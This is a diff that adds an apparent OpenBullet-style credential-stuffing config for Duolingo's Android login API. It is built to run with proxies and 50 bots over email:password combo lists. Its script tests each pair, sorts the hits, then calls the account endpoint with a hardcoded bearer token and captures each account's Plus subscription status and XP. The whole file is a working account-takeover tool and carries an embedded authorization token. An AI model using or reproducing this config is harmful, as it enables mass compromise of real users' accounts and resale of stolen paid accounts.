@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "Duolingo",
+  "SuggestedBots": 50,
+  "LastModified": "2018-07-26T03:14:22.5897091+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://android-api.duolingo.com/2017-06-30/login?fields=id" AutoRedirect=TRUE 
+  CONTENT "{\"password\":\"<PASS>\",\"identifier\":\"<USER>\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Duodroid/3.92.0 Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G955N Build/NRD90M)" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "id" 
+  KEYCHAIN Retry OR 
+    KEY "requests" 
+  KEYCHAIN Failure OR 
+    KEY "{}" 
+PARSE "<SOURCE>" LR "{\"id\":" "}" Recursive=FALSE -> VAR "ID" "" "" 
+REQUEST POST "https://android-api.duolingo.com/2017-06-30/batch?fields=responses%7Bstatus%2Cbody%7D" AutoRedirect=TRUE 
+  CONTENT "{\"requests\":[{\"body\":\"{\\"timezone\\":\\"Africa/Brazzaville\\"}\",\"url\":\"/2017-06-30/users/<ID>?\",\"method\":\"GET\"}]}" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Duodroid/3.92.0 Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G955N Build/NRD90M)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1MzI1NzI2ODksInN1YiI6NDA5NzAxNzUxLCJleHAiOjQ2ODYxNzI2ODl9.ifIygSNU1cICP7dhUKEq3VtK03ts4BEJZQbAw2ov85E" 
+PARSE "<SOURCE>" LR "hasPlus\\":" "}" Recursive=FALSE -> CAP "PLUS" "" "" 
+PARSE "<SOURCE>" LR "xp\\":" "," Recursive=FALSE -> CAP "XP" "" "" 
